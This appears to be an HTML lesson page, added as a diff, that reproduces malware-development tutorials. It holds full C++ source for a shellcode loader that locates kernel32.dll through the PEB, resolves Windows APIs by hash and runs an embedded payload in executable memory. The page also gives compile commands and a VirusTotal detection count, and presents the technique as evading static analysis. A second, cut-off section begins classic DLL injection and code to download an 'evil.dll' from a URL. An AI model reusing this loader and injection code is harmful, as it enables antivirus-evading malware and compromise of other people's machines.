@@ -1,0 +1,938 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development tricks. Find kernel32.dll base: asm style.</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #13</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development tricks. Find kernel32.dll base: asm style.</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This section is the result of self-researching interesting trick in real-life malwares. In the one of my posts I wrote about using <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetModuleHandle</code>. It is returns a handle a specified DLL. For example:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">#include &lt;windows.h&gt;
+LPVOID (WINAPI * pVirtualAlloc)(
+LPVOID lpAddress, SIZE_T dwSize,
+DWORD flAllocationType, DWORD flProtect);
+//...
+int main() {
+DWORD oldprotect = 0;
+HMODULE hk32 = GetModuleHandle("kernel32.dll");
+pVirtualAlloc = GetProcAddress(hk32, "VirtualAlloc");
+//...
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, the actual way to execute shellcode is something like this (meow.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">#include &lt;windows.h&gt;
+
+LPVOID (WINAPI * pVirtualAlloc)(
+LPVOID lpAddress, SIZE_T dwSize,
+DWORD flAllocationType, DWORD flProtect);
+unsigned char my_payload[] =
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+
+int main() {
+HMODULE hk32 = GetModuleHandle("kernel32.dll");
+pVirtualAlloc = GetProcAddress(hk32, "VirtualAlloc");
+PVOID lb = pVirtualAlloc(0, sizeof(my_payload),
+MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+memcpy(lb, my_payload, sizeof(my_payload));
+HANDLE th = CreateThread(0, 0,
+(PTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
+WaitForSingleObject(th, -1);
+}
+So this code contains very basic logic for executing payload. In this case, for simplicity,
+it’s use “meow-meow” messagebox payload.
+Let’s compile it:
+
+x86_64-w64-mingw32-g++ meow.cpp -o meow.exe \
+-mconsole -I/usr/share/mingw-w64/include/ -s \
+-ffunction-sections -fdata-sections -Wno-write-strings \
+-Wint-to-pointer-cast -fno-exceptions \
+-fmerge-all-constants -static-libstdc++ \
+-static-libgcc -fpermissive
+
+and run:
+
+We used GetModuleHandle function to locate kernel32.dll in memory. It’s possible</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">to go around this by finding library location in the <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">PEB</code>. assembly way :) In the one of the previous sections I wrote about <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">TEB</code> and <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">PEB</code> structures and I found kernel32 via asm. The following is obtained:</p>
+
+            <div id="1-offset-to-the-peb-struct-is-0x030" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>1. offset to the PEB struct is 0x030</span>
+                </h3>
+            </div>
+
+            <div id="2-offset-to-ldr-within-peb-is-0x00c" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>2. offset to LDR within PEB is 0x00c</span>
+                </h3>
+            </div>
+
+            <div id="3-offset-to-inmemoryordermodulelist-is-0x014" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>3. offset to InMemoryOrderModuleList is 0x014</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">4. 1st loaded module is our .exe 5. 2nd loaded module is ntdll.dll</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">6. 3rd loaded module is kernel32.dll 7. 4th loaded module is kernelbase.dll Today I will consider x64 architecture. Offsets are different: 1. <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">PEB</code> address is located at an address relative to GS register: GS:[0x60]</p>
+
+            <div id="2-offset-to-ldr-within-peb-is-0x18" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>2. offset to LDR within PEB is 0x18</span>
+                </h3>
+            </div>
+
+            <div id="3-kernel32-dll-base-address-at-0x10" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>3. kernel32.dll base address at 0x10</span>
+                </h3>
+            </div>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So: static HMODULE getKernel32(DWORD myHash) { HMODULE kernel32; INT_PTR peb = __readgsqword(0x60); auto modList = 0x18; auto modListFlink = 0x18; auto kernelBaseAddr = 0x10; auto mdllist = *(INT_PTR*)(peb + modList); auto mlink = *(INT_PTR*)(mdllist + modListFlink); auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr); auto mdl = (LDR_MODULE*)mlink; do { mdl = (LDR_MODULE*)mdl->e[0].Flink;</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">if (mdl-&gt;base != nullptr) {
+if (calcMyHashBase(mdl) == myHash) { // kernel32.dll hash
+break;
+}
+}
+} while (mlink != (INT_PTR)mdl);
+kernel32 = (HMODULE)mdl-&gt;base;
+return kernel32;
+}
+Then for finding GetProcAddress and GetModuleHandle I used my getAPIAddr
+function from my post:
+static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
+PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
+PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)(
+(LPBYTE)h + img_dos_header-&gt;e_lfanew);
+PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
+
+(LPBYTE)h +
+img_nt_header-&gt;
+OptionalHeader.
+DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
+VirtualAddress);
+PDWORD fAddr = (PDWORD)(
+(LPBYTE)h + img_edt-&gt;AddressOfFunctions);
+PDWORD fNames = (PDWORD)(
+(LPBYTE)h + img_edt-&gt;AddressOfNames);
+PWORD fOrd = (PWORD)(
+(LPBYTE)h + img_edt-&gt;AddressOfNameOrdinals);
+for (DWORD i = 0; i &lt; img_edt-&gt;AddressOfFunctions; i++) {
+LPSTR pFuncName = (LPSTR)(
+(LPBYTE)h + fNames[i]);
+if (calcMyHash(pFuncName) == myHash) {
+printf("successfully found! %s - %d\n",
+pFuncName, myHash);
+return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
+}
+}
+return nullptr;
+}
+And, respectively, the main() function logic is different:
+int main() {
+HMODULE mod = getKernel32(56369259);
+fnGetModuleHandleA myGetModuleHandleA =
+(fnGetModuleHandleA)getAPIAddr(mod, 4038080516);
+fnGetProcAddress myGetProcAddress =
+(fnGetProcAddress)getAPIAddr(mod, 448915681);
+HMODULE hk32 = myGetModuleHandleA("kernel32.dll");
+fnVirtualAlloc myVirtualAlloc =
+(fnVirtualAlloc)myGetProcAddress(
+hk32, "VirtualAlloc");
+fnCreateThread myCreateThread =
+(fnCreateThread)myGetProcAddress(
+hk32, "CreateThread");
+fnWaitForSingleObject myWaitForSingleObject =
+(fnWaitForSingleObject)myGetProcAddress(
+hk32, "WaitForSingleObject");
+PVOID lb = myVirtualAlloc(0, sizeof(my_payload),
+MEM_COMMIT | MEM_RESERVE,
+
+PAGE_EXECUTE_READWRITE);
+memcpy(lb, my_payload, sizeof(my_payload));
+HANDLE th = myCreateThread(NULL, 0,
+(PTHREAD_START_ROUTINE)lb, NULL, 0, NULL);
+myWaitForSingleObject(th, INFINITE);
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, I used Win32 API call by hash trick. Then full source code (hack.cpp) is:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">/*
+* hack.cpp - find kernel32 from PEB,
+assembly style. C++ implementation
+* @cocomelonc
+* https://cocomelonc.github.io/tutorial/
+2022/04/02/malware-injection-18.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+typedef struct _UNICODE_STRING {
+USHORT Length;
+USHORT MaximumLength;
+PWSTR Buffer;
+} UNICODE_STRING;
+struct LDR_MODULE {
+LIST_ENTRY e[3];
+HMODULE base;
+void* entry;
+UINT size;
+UNICODE_STRING dllPath;
+UNICODE_STRING dllname;
+};
+typedef HMODULE(WINAPI *fnGetModuleHandleA)(
+LPCSTR lpModuleName
+);
+typedef FARPROC(WINAPI *fnGetProcAddress)(
+HMODULE hModule,
+LPCSTR lpProcName
+);
+typedef PVOID(WINAPI *fnVirtualAlloc)(
+LPVOID lpAddress,
+
+SIZE_T dwSize,
+DWORD flAllocationType,
+DWORD flProtect
+);
+typedef PVOID(WINAPI *fnCreateThread)(
+LPSECURITY_ATTRIBUTES
+lpThreadAttributes,
+SIZE_T
+dwStackSize,
+LPTHREAD_START_ROUTINE lpStartAddress,
+LPVOID
+lpParameter,
+DWORD
+dwCreationFlags,
+LPDWORD
+lpThreadId
+);
+typedef PVOID(WINAPI *fnWaitForSingleObject)(
+HANDLE hHandle,
+DWORD dwMilliseconds
+);
+DWORD calcMyHash(char* data) {
+DWORD hash = 0x35;
+for (int i = 0; i &lt; strlen(data); i++) {
+hash += data[i] + (hash &lt;&lt; 1);
+}
+return hash;
+}
+static DWORD calcMyHashBase(LDR_MODULE* mdll) {
+char name[64];
+size_t i = 0;
+while (mdll-&gt;dllname.Buffer[i] &amp;&amp; i &lt; sizeof(name) - 1) {
+name[i] = (char)mdll-&gt;dllname.Buffer[i];
+i++;
+}
+name[i] = 0;
+return calcMyHash((char *)CharLowerA(name));
+}
+static HMODULE getKernel32(DWORD myHash) {
+HMODULE kernel32;
+INT_PTR peb = __readgsqword(0x60);
+auto modList = 0x18;
+auto modListFlink = 0x18;
+auto kernelBaseAddr = 0x10;
+
+auto mdllist = *(INT_PTR*)(peb + modList);
+auto mlink = *(INT_PTR*)(mdllist + modListFlink);
+auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);
+auto mdl = (LDR_MODULE*)mlink;
+do {
+mdl = (LDR_MODULE*)mdl-&gt;e[0].Flink;
+if (mdl-&gt;base != nullptr) {
+if (calcMyHashBase(mdl) == myHash) { // kernel32.dll hash
+break;
+}
+}
+} while (mlink != (INT_PTR)mdl);
+kernel32 = (HMODULE)mdl-&gt;base;
+return kernel32;
+}
+static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
+PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
+PIMAGE_NT_HEADERS img_nt_header =
+(PIMAGE_NT_HEADERS)(
+(LPBYTE)h + img_dos_header-&gt;e_lfanew);
+PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
+(LPBYTE)h +
+img_nt_header-&gt;
+OptionalHeader.
+DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
+VirtualAddress);
+PDWORD fAddr = (PDWORD)(
+(LPBYTE)h + img_edt-&gt;AddressOfFunctions);
+PDWORD fNames = (PDWORD)(
+(LPBYTE)h + img_edt-&gt;AddressOfNames);
+PWORD fOrd = (PWORD)(
+(LPBYTE)h + img_edt-&gt;AddressOfNameOrdinals);
+for (DWORD i = 0; i &lt; img_edt-&gt;AddressOfFunctions; i++) {
+LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
+if (calcMyHash(pFuncName) == myHash) {
+printf("successfully found! %s - %d\n",
+pFuncName, myHash);
+return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
+}
+}
+return nullptr;
+}
+
+unsigned char my_payload[] =
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+int main() {
+HMODULE mod = getKernel32(56369259);
+fnGetModuleHandleA myGetModuleHandleA =
+(fnGetModuleHandleA)getAPIAddr(mod, 4038080516);
+fnGetProcAddress myGetProcAddress =
+(fnGetProcAddress)getAPIAddr(mod, 448915681);
+HMODULE hk32 = myGetModuleHandleA("kernel32.dll");
+fnVirtualAlloc myVirtualAlloc =
+(fnVirtualAlloc)myGetProcAddress(
+hk32, "VirtualAlloc");
+fnCreateThread myCreateThread =
+(fnCreateThread)myGetProcAddress(
+hk32, "CreateThread");
+fnWaitForSingleObject myWaitForSingleObject =
+(fnWaitForSingleObject)myGetProcAddress(
+hk32, "WaitForSingleObject");
+PVOID lb = myVirtualAlloc(0, sizeof(my_payload),
+MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+memcpy(lb, my_payload, sizeof(my_payload));
+HANDLE th = myCreateThread(NULL, 0,
+(PTHREAD_START_ROUTINE)lb, NULL, 0, NULL);
+myWaitForSingleObject(th, INFINITE);
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, I used the same hash algorithm.</p>
+
+            <div id="demo" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Demo</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile it: x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -Wint-to-pointer-cast \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and run (on victim’s windows 10 x64 machine): .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is worked perfectly :) Let’s go to upload to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/0f5204336b3250fe2756b0a675013099be58f99a 522e3e14161c1709275ec2d5/detection So 6 of 69 AV engines detect our file as malicious This tricks can be used to make the static analysis of our malware slightly harder, mainly focusing on PE format and common indicators. I saw this trick in the source code of Conti ransomware I hope this section spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">PEB</code> structure <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">TEB</code> structure PEB_LDR_DATA structure <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetModuleHandleA</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetProcAddress</code> windows shellcoding - part 1 windows shellcoding - find kernel32 Conti ransomware source code source code in Github</p>
+
+            <div id="32-malware-development-tricks-download-and-inject-logic-c" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>32. malware development tricks. Download and inject logic. C++</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is the result of self-researching interesting trick in real-life malwares. download and execute Download and execute or in our case download and inject is interesting trick and designed to download payload or evil DLL from a url, with an emphasis on http, and execute or inject it. The benefits to the download/execute (or download/inject) approach are that it can be used behind networks that filter all other traffic aside from HTTP. It can even work through a pre-configured proxy given that said proxy does not require authentication information.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">First of all, let’s go to consider classic DLL injection malware. In the simplest case it will look like this:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+* classic DLL injection example
+* author: @cocomelonc
+*/
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+char evilDLL[] = "C:\\evil.dll";
+unsigned int evilLen = sizeof(evilDLL) + 1;
+
+int main(int argc, char* argv[]) {
+HANDLE ph; // process handle
+HANDLE rt; // remote thread
+LPVOID rb; // remote buffer
+HMODULE hKernel32 = GetModuleHandle("Kernel32");
+VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
+// parse process pid
+if ( atoi(argv[1]) == 0) {
+printf("PID not found :( exiting...\n");
+return -1;
+}
+printf("PID: %i", atoi(argv[1]));
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE,
+DWORD(atoi(argv[1])));
+rb = VirtualAllocEx(ph, NULL, evilLen,
+(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
+rt = CreateRemoteThread(ph, NULL, 0,
+(LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
+CloseHandle(ph);
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">It’s pretty simple as you can see. Here I want to add some simple logic for downloading our evil.dll. In the simplest case it will look like this:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">// download evil.dll from url
+char* getEvil() {
+HINTERNET hSession = InternetOpen((LPCSTR)"Mozilla/5.0",
+INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
